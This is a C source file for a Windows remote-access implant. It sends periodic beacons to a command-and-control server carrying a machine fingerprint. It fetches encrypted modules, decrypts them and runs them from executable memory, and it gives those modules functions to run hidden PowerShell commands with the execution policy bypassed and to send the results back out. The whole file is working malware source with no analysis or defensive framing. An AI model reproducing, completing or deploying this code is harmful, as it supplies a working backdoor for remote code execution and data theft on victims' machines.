#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <stdint.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

#define IP1 127
#define IP2 0
#define IP3 0
#define IP4 70  // Calculated as: original_ip4 - IP1 (186 - 192 = -6, but using positive for Windows)
#define PORT 0x5000

extern void* chacha20_Full(void* message, void* buffer, uint64_t length);


typedef struct {
    int (*gostExecute)(const char* command, char* output_buffer, size_t buffer_size);
    BOOL (*gostSend)(const char* data, size_t length);
} API_TABLE;

API_TABLE api;
char gostSendBuf[4096];

uint64_t generate_unique_id() {
    uint64_t unique_id = 0;

    // Get computer name
    char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computer_name);
    if (GetComputerNameA(computer_name, &size)) {
        for (DWORD i = 0; i < size; i++) {
            unique_id = _rotr64(unique_id, 13) ^ (uint64_t)(unsigned char)computer_name[i];
        }
    }

    // Get volume information
    DWORD serial_number = 0;
    if (GetVolumeInformationA("C:\\", NULL, 0, &serial_number, NULL, NULL, NULL, 0)) {
        unique_id ^= ((uint64_t)serial_number << 32) | serial_number;
    }

    return unique_id;
}

DWORD WINAPI ModuleThread(LPVOID lpParameter) {
    typedef void (*module_entry_t)(void *);

    module_entry_t module_entry = (module_entry_t)lpParameter; // cast, no call
    void *api_table = &api;    // or just `api` if api is already a pointer
    module_entry(api_table);   // call with one argument

    return 0;
}

BOOL execute_module_current_process(uint8_t* module_data, uint64_t module_size) {
    if (!module_data || module_size == 0) {
        printf("Invalid module data or size\n");
        return FALSE;
    }

    // Allocate new executable memory
    uint8_t* exec_memory = (uint8_t*)VirtualAlloc(
        NULL,
        module_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!exec_memory) {
        printf("VirtualAlloc failed: %lu\n", GetLastError());
        return FALSE;
    }

    // Copy module to executable memory
    memcpy(exec_memory, module_data, module_size);


    // Create a thread to execute the module
    HANDLE hThread = CreateThread(
        NULL,
        0,
        ModuleThread,
        exec_memory,
        0,
        NULL);
    
    if (!hThread) {
        printf("CreateThread failed: %lu\n", GetLastError());
        return FALSE;
    }

    //printf("Module executing in new thread\n");
    
    // Wait for thread to complete (optional)
    WaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(hThread);
    return TRUE;
}

void beacon_to_c2(SOCKET sock, const char* server_ip, int port, uint64_t id) {
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        closesocket(sock);
        return;
    }
    
    // Send HTTP-like request
    unsigned char http_request[] = {
        0xE8, 0xFE, 0xF6, 0x2F, 0xC6, 0xEA, 0x20, 0x4B,
        0x52, 0x09, 0xCD, 0xA1, 0x63, 0xF7, 0x94, 0xC8,
        0x81, 0, 0, 0, 0, 0, 0, 0, 0   // reserve 4 bytes for DWORD
    };

    // copy DWORD into buffer (little endian on Windows)
    memcpy(&http_request[17], &id, sizeof(uint64_t));

    send(sock, (const char*)http_request, sizeof(http_request), 0);

    //     // debug print
    // printf("Sent %zu bytes:\n", sizeof(http_request));
    // for (size_t i = 0; i < sizeof(http_request); i++) {
    //     printf("%02X ", http_request[i]);
    // }
    // printf("\n");
        
    char response[256];
    int bytes_received = recv(sock, response, sizeof(response) - 1, 0);
    
    if (bytes_received > 0) {
        response[bytes_received] = '\0';
        // Process response (module data)
        if (strstr(response, "NSLM55IM") != NULL) {
            // Found module signature
            char* module_data = strstr(response, "NSLM55IM") + 8;
            uint64_t module_size = bytes_received - 8;
            
            chacha20_Full(module_data,module_data, (uint64_t)module_size);
            //printf("module decrypted\n");

            execute_module_current_process(module_data, (uint64_t)module_size);
            
        }
    }
    
    closesocket(sock);
}

void c2_communication() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return;
    }
    
    uint64_t unique_id = generate_unique_id();
    //printf("Unique ID: 0x%x\n", unique_id);
    
    while (TRUE) {
        // Sleep for 30 seconds
        Sleep(20000);
        
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            continue;
        }
        
        const char* server_ip = "127.0.0.1";
        //snprintf(server_ip, sizeof(server_ip), "%d.%d.%d.%d", IP1, IP2, IP3, IP4);
        
        beacon_to_c2(sock, server_ip, 80, unique_id);
    }
    
    WSACleanup();
}

int gostExecute(const char* command, char* output_buffer, size_t buffer_size) {
    SECURITY_ATTRIBUTES sa;
    HANDLE hReadPipe, hWritePipe;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    CHAR buffer[1000];
    DWORD bytesRead;
    BOOL success;
    size_t total_bytes = 0;

    // Set up security attributes for the pipe
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Create the pipe
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        fprintf(stderr, "CreatePipe failed. Error: %lu\n", GetLastError());
        return -1;
    }

    // Ensure the read handle is not inherited
    if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
        fprintf(stderr, "SetHandleInformation failed. Error: %lu\n", GetLastError());
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return -1;
    }

    // Set up startup info for the process
    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    si.dwFlags |= STARTF_USESTDHANDLES;

    // Build the PowerShell command line
    char powershell_cmd[1024];

    ZeroMemory(powershell_cmd, 1024);
    // Use -Command parameter and wrap the command in quotes
    snprintf(powershell_cmd, sizeof(powershell_cmd), "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"%s\"", command);

    // Create the PowerShell process
    if (!CreateProcessA(
        NULL,                   // No module name (use command line)
        powershell_cmd,         // Command line
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        TRUE,                   // Handles are inherited
        CREATE_NO_WINDOW,       // Creation flags - no window
        NULL,                   // Use parent's environment
        NULL,                   // Use parent's starting directory
        &si,                    // Pointer to STARTUPINFO structure
        &pi)) {                 // Pointer to PROCESS_INFORMATION structure
        
        fprintf(stderr, "CreateProcess failed. Error: %lu\n", GetLastError());
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return -1;
    }

    // Close the write end of the pipe so we can read from it
    CloseHandle(hWritePipe);

    // Read output from the pipe
    output_buffer[0] = '\0'; // Initialize output buffer

    int Allbyteread;
    
    while (TRUE) {
        success = ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
        Allbyteread += bytesRead;
        
        if (!success || bytesRead == 0) {
            break;
        }

        buffer[bytesRead] = '\0'; // Null-terminate the buffer
        
        // Append to output buffer if there's space
        if (total_bytes + bytesRead < buffer_size - 1) {
            strncat(output_buffer, buffer, buffer_size - total_bytes - 1);
            total_bytes += bytesRead;
        } else {
            // Buffer is full, break out
            break;
        }
    }

    // Wait for the process to complete
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Get the exit code
    DWORD exit_code;
    GetExitCodeProcess(pi.hProcess, &exit_code);

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    return Allbyteread;
}

BOOL gostSend(const char* data, size_t length) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    const char* ip_str = "127.0.0.1";
    
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return FALSE;
    }

    // Create socket
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }

    // Prepare data
    if (length > sizeof(gostSendBuf) - 10) {
        closesocket(s);
        WSACleanup();
        return FALSE;
    }
    
    memcpy(gostSendBuf, "GET /data=", 10);

    memcpy(gostSendBuf + 10, data, length);

    chacha20_Full(gostSendBuf, gostSendBuf, length + 10);

    
    server.sin_addr.s_addr = inet_addr(ip_str);
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        int err = WSAGetLastError();
        printf("connect failed, error: %d\n", err);
        closesocket(s);
        WSACleanup();
        return FALSE;
    }


    if (send(s, gostSendBuf, (int)(length + 10), 0) < 0) {
        closesocket(s);
        WSACleanup();
        return FALSE;
    }

    closesocket(s);
    WSACleanup();
    return TRUE;
}


// Initialize API table
API_TABLE init_api_table() {
    API_TABLE table;
    table.gostExecute = gostExecute;
    table.gostSend = gostSend;
    return table;
}

int main() {
    // Initialize API table
    api = init_api_table();
    
    // Start C2 communication
    c2_communication();
    return 0;
}